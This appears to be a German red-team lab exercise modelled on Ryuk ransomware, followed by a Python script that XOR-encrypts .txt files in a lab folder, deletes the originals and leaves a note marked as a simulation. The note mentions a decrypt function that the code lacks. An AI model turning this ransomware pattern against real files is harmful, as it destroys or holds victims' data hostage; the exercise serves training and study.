## Übung 1.2 (Ryuk - Red Team) 
```
Red Team = Angreifer        
Erstelle ein bash Script das mehrere Dateinamen als Argumente akzeptiert und diese Dateien nach der von Ryuk angewendeten Strategie verschlüsselt. Verwende openssl.        
Z.B. alle Dateien im Verzeichnis verschlüsseln:         
$ ryuk_ransom *        
Nach dem Verschlüsseln aller Daten soll eine furchterregende "Ransom Note" ausgegeben    
```

Python-Script, was die Daten verschlüsselt. 
```
#!/usr/bin/env python3
from pathlib import Path

ZIELORDNER = Path.home() / "lab" / "opfer"
SCHLUESSEL = 42          
ENDUNG = ".RYUKSIM"  

def xor_datei(pfad: Path):
    daten = pfad.read_bytes()
    verwandelt = bytes(b ^ SCHLUESSEL for b in daten)
    ziel = pfad.with_suffix(pfad.suffix + ENDUNG)
    ziel.write_bytes(verwandelt)
    pfad.unlink()  # Original entfernen (im Lab unkritisch, wir haben Snapshot)
    print(f"[+] bearbeitet: {pfad.name} -> {ziel.name}")

def note_ablegen():
    note = ZIELORDNER / "RyukReadMe.txt"
    note.write_text(
        "SIMULATION - Deine Testdateien wurden fuer die Uebung 'verschluesselt'.\n"
        "Dies ist KEINE echte Ransomware. Fuehre entschluesseln() aus, um sie\n"
        "wiederherzustellen.\n"
    )
    print(f"[+] Ransom-Note abgelegt: {note.name}")

def verschluesseln():
    for p in ZIELORDNER.glob("*.txt"):
        xor_datei(p)
    note_ablegen()

if __name__ == "__main__":
    verschluesseln()
```
